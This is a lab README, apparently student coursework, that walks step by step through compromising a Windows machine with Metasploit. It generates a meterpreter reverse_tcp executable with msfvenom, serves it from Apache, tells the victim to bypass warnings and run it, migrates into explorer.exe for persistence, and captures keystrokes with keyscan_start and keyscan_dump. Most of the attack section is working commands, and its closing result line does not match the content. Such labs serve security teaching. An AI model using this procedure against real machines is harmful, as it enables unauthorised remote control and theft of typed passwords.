# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![Screenshot from 2023-05-22 14-48-04](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/197fd273-625d-4d29-8363-24ebb8a85d54)




copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/6b1f530f-289e-4220-bff3-ec89471550c3)


Start apache server
sudo systemctl apache2 start and Check the status of apache2

![Screenshot from 2023-05-22 14-50-20](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/69e9dc66-983f-491f-8d4e-650a17b6a8be)







Invoke msfconsole:
## OUTPUT:

![Screenshot from 2023-05-22 14-51-31](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/66454e3a-be70-469d-b3fa-a35ec207dfa2)




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![Screenshot from 2023-05-22 14-52-02](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/52ee054f-56a9-412e-b32a-997b56a7f7a5)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![Screenshot 2023-05-26 154555](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/a5f7954b-027f-469e-99f2-ff379d6915a8)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![Screenshot 2023-05-26 154818](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/977882af-8892-4bea-ae73-60a66edcdf65)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.


keyscan_dump	Shows the keystrokes captured so far
```
![Screenshot 2023-05-26 154955](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/e6f8163a-6708-407d-9bd6-ca6992dd3925)
```

## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
